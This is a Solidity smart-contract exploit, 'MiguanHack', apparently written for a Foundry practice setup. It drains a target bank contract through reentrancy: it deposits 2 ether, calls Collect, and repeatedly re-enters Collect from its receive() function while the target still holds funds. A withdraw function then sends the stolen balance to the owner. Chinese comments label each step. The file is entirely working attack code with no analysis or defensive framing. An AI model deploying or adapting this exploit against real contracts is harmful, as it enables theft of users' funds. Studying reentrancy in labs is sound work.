// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.28;
import "forge-std/console.sol";

interface ICNBank {
    function Deposit(uint256 _unlockTime) external payable;
    function Collect(uint256 _am) external payable;
}

contract MiguanHack {
    ICNBank public target;
    address public owner;

    constructor(address _target) {
        target = ICNBank(_target);
        owner = msg.sender;
    }

    uint256 constant AMOUNT = 2 ether;

    // 1. 存入建立余额
    function deposit() external payable {
        require(msg.value >= AMOUNT, "need >= 2 ether");
        target.Deposit{value: AMOUNT}(0);
    }

    // 2. 触发取款 + 重入
    function exploit() external {
        target.Collect(AMOUNT);
    }

    // 3. 收到转账时重入
    receive() external payable {
        console.log("balance in target: ", address(target).balance / 1 ether, "ETH");
        if (address(target).balance >= AMOUNT) {
            console.log((address(target).balance) / 1 ether, "ETH left in bank, reentering...");
            target.Collect(AMOUNT);
        }
    }

    // 3. 提走所有收益
    function withdraw() external {
        require(msg.sender == owner);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }
}
